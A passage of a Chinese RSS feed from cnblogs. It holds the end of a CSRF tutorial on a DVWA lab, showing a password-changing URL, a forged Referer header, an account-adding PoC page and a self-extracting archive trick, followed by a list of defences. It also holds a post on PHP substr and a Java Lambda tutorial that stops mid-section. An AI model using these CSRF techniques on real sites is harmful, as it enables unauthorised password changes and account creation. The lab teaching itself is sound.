&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191944675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面把referer删除了，可以改密码，说明csrf可用。&lt;/p&gt;
&lt;p&gt;构造对目标构造如下url，存在CSRF漏洞的情况下，一旦在线点击访问就能改密码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://192.168.18.62:86/dvwa/vulnerabilities/csrf/?password_new=password&amp;amp;password_conf=password&amp;amp;Change=Change
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191959931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;说一下中级的：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;中级的发现无法直接执行再改密码，先看源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192009592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192018620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192026689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7.6525821596244&quot;&gt;
&lt;p&gt;但通过观察数据包发现，其没有referer信息，那么对其进行了一个伪造Referer：&lt;/p&gt;
&lt;p&gt;​ Referer:&lt;a href=&quot;http://192.168.18.62:86/dvwa/vulnerabilities/csrf/&quot; target=&quot;_blank&quot;&gt;http://192.168.18.62:86/dvwa/vulnerabilities/csrf/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;加入数据包中，发现密码被修改了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192038338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;（改密码也就是说：没得任何验证如没有验证码、没得token、没得Referer、没得原密码校验等，很容易就造成通杀直接，受害者回话状态点击插入了url的地址，直接被修改密码。）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;3）、添加账号&quot;&gt;3）、添加账号&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;strong&gt;下面利用一个网站进行添加账号操作：&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先，利用自建网站进行添加账号操作，抓包将包生成为poc，建立test.html，废掉此包。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192048979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192056887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;目前仍为管理登录状态，在这个状态下点击了攻击者的test.html。看下效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192106434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192114455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;攻击者的效果成功达成。&lt;/p&gt;
&lt;h3 id=&quot;4）、自解压缩包&quot;&gt;4）、自解压缩包&lt;/h3&gt;
&lt;p&gt;配置方式如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2021011619212465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116192155299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;一旦解压就会打开百度，自行尝试吧。&lt;/p&gt;
&lt;h2 id=&quot;7、防范方法&quot;&gt;7、防范方法&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;验证HTTP Referer字段&lt;/li&gt;
&lt;li&gt;在请求地址中添加token并验证&lt;/li&gt;
&lt;li&gt;在HTTP头中自定义属性并验证&lt;/li&gt;
&lt;li&gt;在服务端严格区分好POST和GET的数据请求&lt;/li&gt;
&lt;li&gt;使用验证码或者密码确认方式进行&lt;/li&gt;
&lt;li&gt;白名单&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Tue, 19 Jan 2021 00:47:00 +0000</pubDate>
<dc:creator>白蚁先生</dc:creator>
<og:description>(文章目录) SSRF服务端请求伪造（外网访问内网） SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jeromeyoung/p/14286997.html</dc:identifier>
</item>
<item>
<title>【函数分享】每日PHP函数分享(2021-1-19) - 梦中程序员</title>
<link>http://www.cnblogs.com/leruge/p/14296179.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/leruge/p/14296179.html</guid>
<description>&lt;p&gt;&lt;strong&gt;substr &lt;/strong&gt;函数返回字符串的一部分。&lt;strong&gt;注释：&lt;/strong&gt;如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:php;gutter:true;&quot;&gt;
string substr (string $string , int $start [, int $length ])
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;参数描述&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;string&lt;/code&gt;&lt;/strong&gt;    输入字符串。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;start&lt;/code&gt;&lt;/strong&gt;     如果 &lt;code&gt;start&lt;/code&gt; 是非负数，返回的字符串将从 &lt;code&gt;string&lt;/code&gt; 的 &lt;code&gt;start&lt;/code&gt; 位置开始，从 0 开始计算。例如，在字符串 &quot;&lt;em&gt;abcdef&lt;/em&gt;&quot; 中，在位置 &lt;em&gt;0&lt;/em&gt; 的字符是 &quot;&lt;em&gt;a&lt;/em&gt;&quot;，位置 &lt;em&gt;2&lt;/em&gt; 的字符串是 &quot;&lt;em&gt;c&lt;/em&gt;&quot; 等等。如果 &lt;code&gt;start&lt;/code&gt; 是负数，返回的字符串将从 &lt;code&gt;string&lt;/code&gt; 结尾处向前数第 &lt;code&gt;start&lt;/code&gt; 个字符开始。如果 &lt;code&gt;string&lt;/code&gt; 的长度小于或等于 &lt;code&gt;start&lt;/code&gt;，将返回 &lt;strong&gt;&lt;code&gt;FALSE&lt;/code&gt;&lt;/strong&gt;。 &lt;br/&gt;&lt;strong&gt;&lt;code&gt;length&lt;/code&gt;&lt;/strong&gt;    如果提供了正数的 &lt;code&gt;length&lt;/code&gt;，返回的字符串将从 &lt;code&gt;start&lt;/code&gt; 处开始最多包括&lt;code&gt;length&lt;/code&gt; 个字符（取决于 &lt;code&gt;string&lt;/code&gt; 的长度）。    如果提供了负数的 &lt;code&gt;length&lt;/code&gt;，那么 &lt;code&gt;string&lt;/code&gt; 末尾处的许多字符将会被漏掉（若 &lt;code&gt;start&lt;/code&gt; 是负数则从字符串尾部算起）。如果 &lt;code&gt;start&lt;/code&gt; 不在这段文本中，那么将返回一个空字符串。    如果提供了值为 &lt;em&gt;0&lt;/em&gt;，&lt;strong&gt;&lt;code&gt;FALSE&lt;/code&gt;&lt;/strong&gt; 或 &lt;strong&gt;&lt;code&gt;NULL&lt;/code&gt;&lt;/strong&gt; 的 &lt;code&gt;length&lt;/code&gt;，那么将返回一个空字符串。如果没有提供 &lt;code&gt;length&lt;/code&gt;，返回的子字符串将从 &lt;code&gt;start&lt;/code&gt; 位置开始直到字符串结尾。&lt;br/&gt;&lt;strong&gt;返回值：&lt;/strong&gt;返回提取的子字符串， 或者在失败时返回 &lt;strong&gt;&lt;code&gt;FALSE&lt;/code&gt;&lt;/strong&gt;。 &lt;/p&gt;&lt;p&gt;&lt;strong&gt;实例：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;56&quot;&gt;
&lt;pre class=&quot;brush:php;gutter:true;&quot;&gt;
&amp;lt;?php
echo &quot;1) &quot;.var_export(substr(&quot;pear&quot;, 0, 2), true).PHP_EOL;
echo &quot;2) &quot;.var_export(substr(54321, 0, 2), true).PHP_EOL;
echo &quot;3) &quot;.var_export(substr(new apple(), 0, 2), true).PHP_EOL;
echo &quot;4) &quot;.var_export(substr(true, 0, 1), true).PHP_EOL;
echo &quot;5) &quot;.var_export(substr(false, 0, 1), true).PHP_EOL;
echo &quot;6) &quot;.var_export(substr(&quot;&quot;, 0, 1), true).PHP_EOL;
echo &quot;7) &quot;.var_export(substr(1.2e3, 0, 4), true).PHP_EOL;


输出：1) 'pe'
2) '54'
3) 'gr'
4) '1'
5) false
6) false
7) '1200'
?&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Tue, 19 Jan 2021 00:39:00 +0000</pubDate>
<dc:creator>梦中程序员</dc:creator>
<og:description>substr&amp;#160;函数返回字符串的一部分。注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 string substr (string $s</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/leruge/p/14296179.html</dc:identifier>
</item>
<item>
<title>Lambda表达式你会用吗？ - 说故事的五公子</title>
<link>http://www.cnblogs.com/wugongzi/p/14296157.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wugongzi/p/14296157.html</guid>
<description>&lt;h2 id=&quot;函数式编程&quot;&gt;函数式编程&lt;/h2&gt;
&lt;p&gt;在正式学习Lambda之前，我们先来了解一下什么是函数式编程&lt;/p&gt;
&lt;p&gt;我们先看看什么是函数。函数是一种最基本的任务，一个大型程序就是一个顶层函数调用若干底层函数，这些被调用的函数又可以调用其他函数，即大任务被一层层拆解并执行。所以函数就是面向过程的程序设计的基本单元。&lt;/p&gt;
&lt;p&gt;Java不支持单独定义函数，但可以把静态方法视为独立的函数，把实例方法视为自带&lt;code&gt;this&lt;/code&gt;参数的函数。而函数式编程（请注意多了一个“式”字）——Functional Programming，虽然也可以归结到面向过程的程序设计，但其思想更接近数学计算。&lt;/p&gt;
&lt;p&gt;我们首先要搞明白计算机（Computer）和计算（Compute）的概念。在计算机的层次上，CPU执行的是加减乘除的指令代码，以及各种条件判断和跳转指令，所以，汇编语言是最贴近计算机的语言。而计算则指数学意义上的计算，越是抽象的计算，离计算机硬件越远。对应到编程语言，就是越低级的语言，越贴近计算机，抽象程度低，执行效率高，比如C语言；越高级的语言，越贴近计算，抽象程度高，执行效率低，比如Lisp语言。&lt;/p&gt;
&lt;p&gt;函数式编程就是一种抽象程度很高的编程范式，纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。而允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。&lt;/p&gt;
&lt;p&gt;函数式编程的一个特点就是，允许把函数本身作为参数传入另一个函数，还允许返回一个函数！&lt;/p&gt;
&lt;p&gt;函数式编程最早是数学家&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E9%98%BF%E9%9A%86%E4%BD%90%C2%B7%E9%82%B1%E5%A5%87&quot; target=&quot;_blank&quot;&gt;阿隆佐·邱奇&lt;/a&gt;研究的一套函数变换逻辑，又称Lambda Calculus（λ-Calculus），所以也经常把函数式编程称为Lambda计算。&lt;/p&gt;
&lt;p&gt;Java平台从Java 8开始，支持函数式编程。&lt;/p&gt;
&lt;h2 id=&quot;lambda初体验&quot;&gt;Lambda初体验&lt;/h2&gt;
&lt;p&gt;先从一个例子开始，让我们来看一下Lambda可以用在什么地方。&lt;/p&gt;
&lt;h3 id=&quot;例一：创建线程&quot;&gt;例一：创建线程&lt;/h3&gt;
&lt;p&gt;常见创建线程的方法（JDK1.8以前）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//JDK1.7通过匿名内部类的方式创建线程
Thread thread = new Thread(new Runnable() {
    @Override
    public void run() { //实现run方法
        System.out.println(&quot;Thread Run...&quot;);
    }
});

thread.start();
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过匿名内部类的方式创建线程，省去了取名字的烦恼，但是还能不能再简化一些呢？&lt;/p&gt;
&lt;p&gt;JDK1.8 Lambda表达式写法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Thread thread = new Thread(() -&amp;gt; System.out.println(&quot;Thread Run&quot;)); //一行搞定

thread.start();
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们可以看到Lambda一行代码就完成了线程的创建，简直不要太方便。（至于Lambda表达式的语法，我们下面章节再详细介绍）&lt;/p&gt;
&lt;p&gt;如果你的逻辑不止一行代码，那么你还可以这么写&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Thread thread = new Thread(() -&amp;gt; {
    System.out.println(&quot;Thread Run&quot;);
    System.out.println(&quot;Hello&quot;);
});

thread.start();
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;用&lt;code&gt;{}&lt;/code&gt;将代码块包裹起来&lt;/p&gt;
&lt;h3 id=&quot;例二：自定义比较器&quot;&gt;例二：自定义比较器&lt;/h3&gt;
&lt;p&gt;我们先来看一下JDK1.7是如何实现自定义比较器的&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;List&amp;lt;String&amp;gt; list = Arrays.asList(&quot;Hi&quot;, &quot;Life&quot;, &quot;Hello~&quot;, &quot;World&quot;);
Collections.sort(list, new Comparator&amp;lt;String&amp;gt;(){// 接口名
    @Override
    public int compare(String s1, String s2){// 方法名
        if(s1 == null)
            return -1;
        if(s2 == null)
            return 1;
        return s1.length()-s2.length();
    }
});

//输出排序好的List
for (String s : list) {
    System.out.println(s);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的sort方法传入了两个参数，一个是待排序的list，一个是比较器（排序规则），这里也是通过匿名内部类的方式实现的比较器。&lt;/p&gt;
&lt;p&gt;下面我们来看一下Lambda表达式如何实现比较器？&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;List&amp;lt;String&amp;gt; list = Arrays.asList(&quot;Hi&quot;, &quot;Life&quot;, &quot;Hello~&quot;, &quot;World&quot;);
Collections.sort(list, (s1, s2) -&amp;gt;{// 省略了参数的类型，编译器会根据上下文信息自动推断出类型
    if(s1 == null)
        return -1;
    if(s2 == null)
        return 1;
    return s1.length()-s2.length();
});

//输出排序好的List
for (String s : list) {
    System.out.println(s);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们可以看到，Lambda表达式和匿名内部类的作用相同，但是省略了很多代码，可以大大加快开发速度&lt;/p&gt;
&lt;h2 id=&quot;lambda表达式语法&quot;&gt;Lambda表达式语法&lt;/h2&gt;
&lt;p&gt;Lambda 表达式，也可称为闭包，它是推动 Java 8 发布的最重要新特性。Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中）。&lt;/p&gt;
&lt;p&gt;使用 Lambda 表达式可以使代码变的更加简洁紧凑。上一章节我们已经见识到了Lambda表达式的优点，那么Lambda表达式到底该怎么写呢？&lt;/p&gt;
&lt;h3 id=&quot;语法&quot;&gt;语法&lt;/h3&gt;
&lt;p&gt;lambda 表达式的语法格式如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;(parameters) -&amp;gt; expression   //一行代码
  或
(parameters) -&amp;gt;{ statements; }  //多行代码
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;lambda表达式的重要特征:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;可选类型声明：&lt;/strong&gt;不需要声明参数类型，编译器可以统一识别参数值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可选的参数圆括号：&lt;/strong&gt;一个参数无需定义圆括号，但多个参数需要定义圆括号。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可选的大括号：&lt;/strong&gt;如果主体包含了一个语句，就不需要使用大括号。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可选的返回关键字：&lt;/strong&gt;如果主体只有一个表达式返回值则编译器会自动返回值，大括号需要指定明表达式返回了一个数值。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 1. 不需要参数,返回值为 5  
() -&amp;gt; 5  
  
// 2. 接收一个参数(数字类型),返回其2倍的值  
x -&amp;gt; 2 * x  
  
// 3. 接受2个参数(数字),并返回他们的差值  
(x, y) -&amp;gt; x – y  
  
// 4. 接收2个int型整数,返回他们的和  
(int x, int y) -&amp;gt; x + y  
  
// 5. 接受一个 string 对象,并在控制台打印,不返回任何值(看起来像是返回void)  
(String s) -&amp;gt; System.out.print(s)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;函数接口&quot;&gt;函数接口&lt;/h2&gt;
&lt;p&gt;上面几个章节给大家介绍Lambda表达式的基本使用，那么是不是在任意地方都可以使用Lambda表达式呢？&lt;/p&gt;
&lt;p&gt;其实Lambda表达式使用是有限制的。也许你已经想到了，&lt;strong&gt;能够使用Lambda的依据是必须有相应的函数接口&lt;/strong&gt;。（函数接口，是指内部只有一个抽象方法的接口）&lt;/p&gt;
&lt;h3 id=&quot;自定义函数接口&quot;&gt;自定义函数接口&lt;/h3&gt;
&lt;p&gt;自定义函数接口很容易，只需要编写一个只有一个抽象方法的接口即可。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 自定义函数接口
@FunctionalInterface
public interface PersonInterface&amp;lt;T&amp;gt;{
    void accept(T t);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面代码中的@FunctionalInterface是可选的，但加上该标注编译器会帮你检查接口是否符合函数接口规范。就像加入@Override标注会检查是否重载了函数一样。&lt;/p&gt;
&lt;p&gt;那么根据上面的自定义函数式接口，我们就可以写出如下的Lambda表达式。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;PersonInterface p = str -&amp;gt; System.out.println(str);
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;lambda和匿名内部类&quot;&gt;Lambda和匿名内部类&lt;/h2&gt;
&lt;p&gt;经过上面几部分的介绍，相信大家对Lambda表达式已经有了初步认识，学会了如何使用。但想必大家心中始终有一个疑问，Lambda表达式似乎只是为了简化匿名内部类的写法，其他也没啥区别了。这看起来仅仅通过语法糖在编译阶段把所有的Lambda表达式替换成匿名内部类就可以了，事实真的如此吗？&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Main {

    public static void main(String[] args) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                System.out.println(&quot;Anonymous class&quot;);
            }
        }).start();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;匿名内部类也是一个类，只不过我们不需要显示为他定义名称，但是编译器会自动为匿名内部类命名。Main编辑后的文件如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/wugongzi-git/BlogFigurebed@master/image/image-20201217164035157.png&quot; alt=&quot;image-20201217164035157&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到共有两个class文件，一个是Main.class，而另一个则是编辑器为我们命名的内部类。&lt;/p&gt;
&lt;p&gt;下面我们来看一下Lambda表达式会产生几个class文件&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Main {
    public static void main(String[] args) {
        new Thread(() -&amp;gt; System.out.println(&quot;Lambda&quot;)).start();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/wugongzi-git/BlogFigurebed@master/image/image-20201217164610350.png&quot; alt=&quot;image-20201217164610350&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Lambda表达式通过invokedynamic指令实现，书写Lambda表达式不会产生新的类&lt;/p&gt;
&lt;h2 id=&quot;lambda在集合中的运用&quot;&gt;Lambda在集合中的运用&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;既然Lambda表达式这么方便，那么哪些地方可以使用Lambda表达式呢？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们先从最熟悉的&lt;em&gt;Java集合框架(Java Collections Framework, JCF)&lt;/em&gt;开始说起。&lt;/p&gt;
&lt;p&gt;为引入Lambda表达式，Java8新增了&lt;code&gt;java.util.funcion&lt;/code&gt;包，里面包含常用的&lt;strong&gt;函数接口&lt;/strong&gt;，这是Lambda表达式的基础，Java集合框架也新增部分接口，以便与Lambda表达式对接。&lt;/p&gt;
&lt;p&gt;首先回顾一下Java集合框架的接口继承结构：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/objcoding/md-picture/raw/master/img/JCF_Collection_Interfaces.png&quot; alt=&quot;JCF_Collection_Interfaces&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上图中绿色标注的接口类，表示在Java8中加入了新的接口方法，当然由于继承关系，他们相应的子类也都会继承这些新方法。下表详细列举了这些方法。&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;接口名&lt;/th&gt;
&lt;th&gt;Java8新加入的方法&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Collection&lt;/td&gt;
&lt;td&gt;removeIf() spliterator() stream() parallelStream() forEach()&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;List&lt;/td&gt;
&lt;td&gt;replaceAll() sort()&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;Map&lt;/td&gt;
&lt;td&gt;getOrDefault() forEach() replaceAll() putIfAbsent() remove() replace() computeIfAbsent() computeIfPresent() compute() merge()&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;这些新加入的方法大部分要用到&lt;code&gt;java.util.function&lt;/code&gt;包下的接口，这意味着这些方法大部分都跟Lambda表达式相关。我们将逐一学习这些方法。&lt;/p&gt;
&lt;h3 id=&quot;collection中的新方法&quot;&gt;Collection中的新方法&lt;/h3&gt;
&lt;p&gt;如上所示，接口&lt;code&gt;Collection&lt;/code&gt;和&lt;code&gt;List&lt;/code&gt;新加入了一些方法，我们以是&lt;code&gt;List&lt;/code&gt;的子类&lt;code&gt;ArrayList&lt;/code&gt;为例来说明。了解&lt;a href=&quot;https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/2-ArrayList.md&quot; target=&quot;_blank&quot;&gt;Java7&lt;code&gt;ArrayList&lt;/code&gt;实现原理&lt;/a&gt;，将有助于理解下文。&lt;/p&gt;
&lt;h4 id=&quot;foreach&quot;&gt;forEach()&lt;/h4&gt;
&lt;p&gt;该方法的签名为&lt;code&gt;void forEach(Consumer&amp;lt;? super E&amp;gt; action)&lt;/code&gt;，作用是对容器中的每个元素执行&lt;code&gt;action&lt;/code&gt;指定的动作，其中&lt;code&gt;Consumer&lt;/code&gt;是个函数接口，里面只有一个待实现方法&lt;code&gt;void accept(T t)&lt;/code&gt;（后面我们会看到，这个方法叫什么根本不重要，你甚至不需要记忆它的名字）。&lt;/p&gt;
&lt;p&gt;需求：&lt;em&gt;假设有一个字符串列表，需要打印出其中所有长度大于3的字符串.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Java7及以前我们可以用增强的for循环实现：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用曾强for循环迭代
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
for(String str : list){
    if(str.length()&amp;gt;3)
        System.out.println(str);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在使用&lt;code&gt;forEach()&lt;/code&gt;方法结合匿名内部类，可以这样实现：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用forEach()结合匿名内部类迭代
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
list.forEach(new Consumer&amp;lt;String&amp;gt;(){
    @Override
    public void accept(String str){
        if(str.length()&amp;gt;3)
            System.out.println(str);
    }
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码调用&lt;code&gt;forEach()&lt;/code&gt;方法，并使用匿名内部类实现&lt;code&gt;Comsumer&lt;/code&gt;接口。到目前为止我们没看到这种设计有什么好处，但是不要忘记Lambda表达式，使用Lambda表达式实现如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用forEach()结合Lambda表达式迭代
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
list.forEach( str -&amp;gt; {
        if(str.length()&amp;gt;3)
            System.out.println(str);
    });
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码给&lt;code&gt;forEach()&lt;/code&gt;方法传入一个Lambda表达式，我们不需要知道&lt;code&gt;accept()&lt;/code&gt;方法，也不需要知道&lt;code&gt;Consumer&lt;/code&gt;接口，类型推导帮我们做了一切。&lt;/p&gt;
&lt;h4 id=&quot;removeif&quot;&gt;removeIf()&lt;/h4&gt;
